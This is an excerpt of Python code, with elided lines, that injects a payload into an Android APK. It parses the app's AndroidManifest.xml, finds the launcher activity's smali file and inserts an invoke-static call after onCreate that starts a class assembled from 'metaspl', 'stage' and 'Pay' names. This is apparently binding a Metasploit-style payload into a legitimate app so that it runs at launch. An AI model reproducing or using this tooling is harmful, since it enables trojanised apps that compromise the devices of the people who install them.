...
def inject_in_apk(apkfolder,MainActivity,MainBroadcastReceiver,MainService,metaspl,stage,Pay): 
    ...
    apk_xml = open(apkfolder + "/AndroidManifest.xml", "r")
    apk_manifest=""
    ...
    for i in range(0,len(apk_manifest)):
        ...
        if "uses-permission" in apk_manifest[i]:
        ...
        elif "<activity" in apk_manifest[i] and (((("android:name=" in apk_manifest[i] and "<intent-filter>" in apk_manifest[i+1]) and "<action android:name=\"android.intent.action.MAIN\"/>" in apk_manifest[i+2]) and "<category android:name=\"android.intent.category.LAUNCHER\"/>" in apk_manifest[i+3]) and edit_manifest):
            ...
            for line in FindHookFile:
                ...
                if "android:name=" in line:
                    ...
                    HookFile = apkfolder + "/smali/" + (((line.replace("android:name=","")).replace("\"","")).replace(".","/")).replace(">","") + ".smali"
                    ...
                    for line in FindHook:
                        ...
                        if "invoke-super" in line and "onCreate(Landroid/os/Bundle;)V" in line:
                            ...
                            line +="\n    invoke-static {p0}, Lcom/" + metaspl + "/" + stage + "/" + Pay + ";->start(Landroid/content/Context;)V"
                        new_smali+=line
    ...
    with open(apkfolder + "/AndroidManifest.xml", "w") as xml_manifest :
